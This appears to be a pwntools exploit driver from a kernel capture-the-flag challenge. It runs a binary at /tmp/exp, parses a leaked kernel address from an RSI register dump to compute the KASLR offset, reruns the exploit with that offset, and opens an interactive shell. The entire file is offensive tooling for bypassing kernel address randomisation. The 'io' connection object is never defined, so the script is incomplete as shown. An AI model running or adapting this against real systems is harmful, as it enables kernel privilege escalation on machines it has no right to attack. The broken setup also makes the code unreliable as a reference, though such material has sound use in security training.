#!/usr/bin/env python
# coding=utf-8
from pwn import *
import base64
context.log_level = "debug"

io.sendlineafter("$", "/tmp/exp")

io.recvuntil("RSI: ")
kernel_text_addr = int("0x" + io.recv(16), base = 16)
log.success("kernel_text_addr: " + hex(kernel_text_addr))
kernel_offset = kernel_text_addr - 0xffffffff825c5741
io.sendlineafter("$", "/tmp/exp " + hex(kernel_offset))

io.interactive()
